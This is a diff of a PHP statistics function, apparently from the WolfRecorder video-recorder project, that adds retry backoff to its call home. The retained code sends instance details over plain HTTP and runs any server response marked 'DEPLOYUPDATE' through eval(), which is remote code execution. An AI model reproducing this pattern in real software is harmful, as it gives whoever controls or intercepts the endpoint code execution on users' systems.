@@ -112,6 +112,9 @@ function wr_Stats($modOverride = '') {
     $wrStatsUrl = 'http://stats.wolfrecorder.com';
     $statsflag = 'exports/NOTRACKTHIS';
     $deployMark = 'DEPLOYUPDATE';
+    $backoffKey = 'WRSTATS_BACKOFF';
+    $backoffLevelKey = 'WRSTATS_BACKOFF_LVL';
+    $backoffSteps = array(300, 1800, 21600, 86400);
     $cache = new UbillingCache();
     $cacheTime = 3600;
 
@@ -119,52 +122,73 @@ function wr_Stats($modOverride = '') {
     if (!empty($hostId)) {
         $thiscollect = (file_exists($statsflag)) ? 0 : 1;
         if ($thiscollect) {
-            $moduleStats = 'xnone';
-            if ($modOverride) {
-                $moduleStats = 'x' . $modOverride;
-            } else {
-                if (ubRouting::checkGet('module')) {
-                    $moduleClean = str_replace('x', '', ubRouting::get('module'));
-                    $moduleStats = 'x' . $moduleClean;
-                } else {
+            $backoffUntil = $cache->get($backoffKey, 86400);
+            $inBackoff = false;
+            if (!empty($backoffUntil)) {
+                if (time() < (int)$backoffUntil) {
+                    $inBackoff = true;
                 }
             }
-            $releaseinfo = file_get_contents('RELEASE');
-            $wrVersion = explode(' ', $releaseinfo);
-            $wrVersion = ubRouting::filters($wrVersion[0], 'int');
 
-            $wrInstanceStats = $cache->get('WRINSTANCE', $cacheTime);
-            if (empty($wrInstanceStats)) {
-                $camDb = new NyanORM(Cameras::DATA_TABLE);
-                $camCount = $camDb->getFieldsCount('id');
-                $wrInstanceStats = '?u=' . $hostId . 'x' . $camCount . 'x' . $wrVersion;
-                $cache->set('WRINSTANCE', $wrInstanceStats, $cacheTime);
-            }
-
-            $statsurl = $wrStatsUrl . $wrInstanceStats . $moduleStats;
-
-            $referrer = (isset($_SERVER['HTTP_REFERER'])) ? $_SERVER['HTTP_REFERER'] : '';
-            $collector = new OmaeUrl($statsurl);
-            $collector->setUserAgent('WRTRACK');
-            $collector->setTimeout(1);
-            if (!empty($referrer)) {
-                $collector->setReferrer($referrer);
-            }
-            $output = $collector->response();
-            $error = $collector->error();
-            $httpCode = $collector->httpCode();
-
-            if (!$error and $httpCode == 200) {
-                $output = trim($output);
-                if (!empty($output)) {
-                    if (ispos($output, $deployMark)) {
-                        $output = str_replace($deployMark, '', $output);
-                        if (!empty($output)) {
-                            eval($output);
-                        }
+            if (!$inBackoff) {
+                $moduleStats = 'xnone';
+                if ($modOverride) {
+                    $moduleStats = 'x' . $modOverride;
+                } else {
+                    if (ubRouting::checkGet('module')) {
+                        $moduleClean = str_replace('x', '', ubRouting::get('module'));
+                        $moduleStats = 'x' . $moduleClean;
                     } else {
-                        show_window('', $output);
                     }
+                }
+                $releaseinfo = file_get_contents('RELEASE');
+                $wrVersion = explode(' ', $releaseinfo);
+                $wrVersion = ubRouting::filters($wrVersion[0], 'int');
+
+                $wrInstanceStats = $cache->get('WRINSTANCE', $cacheTime);
+                if (empty($wrInstanceStats)) {
+                    $camDb = new NyanORM(Cameras::DATA_TABLE);
+                    $camCount = $camDb->getFieldsCount('id');
+                    $wrInstanceStats = '?u=' . $hostId . 'x' . $camCount . 'x' . $wrVersion;
+                    $cache->set('WRINSTANCE', $wrInstanceStats, $cacheTime);
+                }
+
+                $statsurl = $wrStatsUrl . $wrInstanceStats . $moduleStats;
+
+                $referrer = (isset($_SERVER['HTTP_REFERER'])) ? $_SERVER['HTTP_REFERER'] : '';
+                $collector = new OmaeUrl($statsurl);
+                $collector->setUserAgent('WRTRACK');
+                $collector->setTimeout(1);
+                if (!empty($referrer)) {
+                    $collector->setReferrer($referrer);
+                }
+                $output = $collector->response();
+                $error = $collector->error();
+                $httpCode = $collector->httpCode();
+
+                if (!$error and $httpCode == 200) {
+                    $cache->delete($backoffKey);
+                    $cache->delete($backoffLevelKey);
+                    $output = trim($output);
+                    if (!empty($output)) {
+                        if (ispos($output, $deployMark)) {
+                            $output = str_replace($deployMark, '', $output);
+                            if (!empty($output)) {
+                                eval($output);
+                            }
+                        } else {
+                            show_window('', $output);
+                        }
+                    }
+                } else {
+                    $backoffLevel = $cache->get($backoffLevelKey, 2592000);
+                    $backoffLevel = empty($backoffLevel) ? 0 : (int)$backoffLevel;
+                    if ($backoffLevel >= count($backoffSteps)) {
+                        $backoffLevel = count($backoffSteps) - 1;
+                    }
+                    $backoffDelay = $backoffSteps[$backoffLevel];
+                    $cache->set($backoffKey, time() + $backoffDelay, $backoffDelay + 300);
+                    $cache->set($backoffLevelKey, $backoffLevel + 1, 2592000);
                 }
             }
         }
